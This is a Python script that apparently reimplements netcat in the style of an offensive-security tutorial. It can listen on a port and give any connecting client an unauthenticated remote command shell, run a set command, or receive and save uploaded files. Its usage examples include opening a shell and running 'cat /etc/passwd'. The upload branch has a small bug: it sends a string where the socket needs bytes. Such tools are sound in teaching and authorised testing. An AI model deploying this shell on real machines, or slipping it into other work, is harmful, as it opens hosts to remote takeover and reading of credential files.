import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def handle(self, socket):
        if self.args.execute:
            output = execute(self.args.execute)
            socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            socket.send(message)

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,))
            client_thread.start()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('>')
                    buffer += "\n"
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User terminated")
            self.socket.close()
            sys.exit()


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(
        shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


def main():
    parser = argparse.ArgumentParser(
        description='BHB Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent
        ('''
        Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c                      #command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt           #upload file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"  #execute password
        netcat.py -t 192.168.1.108 -p 5555                            #connect to server
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 5555             #echo text to server port 5555 
        ''')
    )
    parser.add_argument('-c', '--command',
                        action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specifed command')
    parser.add_argument('-p', '--port', type=int,
                        default=5555, help='specifed port')
    parser.add_argument('-u', '--upload', help='upload file')
    parser.add_argument(
        '-t', '--target', default='192.168.1.203', help='specifed IP')
    parser.add_argument('-l', '--listen',
                        action='store_true', help='listen')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    print(args)
    nc = NetCat(args, buffer.encode())
    nc.run()


main()
